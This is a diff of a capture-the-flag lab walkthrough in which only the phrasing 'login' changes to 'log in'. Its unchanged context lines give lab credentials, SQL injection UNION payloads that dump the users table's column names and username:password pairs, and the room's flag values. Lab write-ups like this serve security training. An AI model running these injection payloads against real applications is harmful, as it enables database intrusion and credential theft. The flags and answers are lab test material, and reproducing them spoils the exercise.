@@ -131,7 +131,7 @@ $API_VERSION     = 'v1';
 ?>
 ```
 
-Use `username=hr` and `password=hrpassword123` to login via `http://TARGET_IP/index.php`. Upon logging in successfully, you will get see the flag **THM{LOGGED_IN_USER}**.
+Use `username=hr` and `password=hrpassword123` to log in via `http://TARGET_IP/index.php`. Upon logging in successfully, you will get see the flag **THM{LOGGED_IN_USER}**.
 
 ### What is the flag value after logging in as admin?
 
@@ -143,4 +143,4 @@ Test whether SQL injection is possible for the Candidate Applications table and 
 - Use `' UNION SELECT 1,2,3,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'users' -- -` to reveal `CURRENT_CONNECTIONS,MAX_SESSION_CONTROLLED_MEMORY,MAX_SESSION_TOTAL_MEMORY,TOTAL_CONNECTIONS,USER,id,password,username`. 
 - Use `' UNION SELECT 1,2,3,group_concat(username,':',password SEPARATOR '<br>') FROM users -- -` to reveal `admin:admin@001admin`. 
 
-Log out then use `username=admin` and `password=admin@001admin` to login via `http://TARGET_IP/index.php`. Upon logging in successfully, you will get see the flag **THM{LOGGED_IN_ADMIN1}**.
+Log out then use `username=admin` and `password=admin@001admin` to log in via `http://TARGET_IP/index.php`. Upon logging in successfully, you will get see the flag **THM{LOGGED_IN_ADMIN1}**.
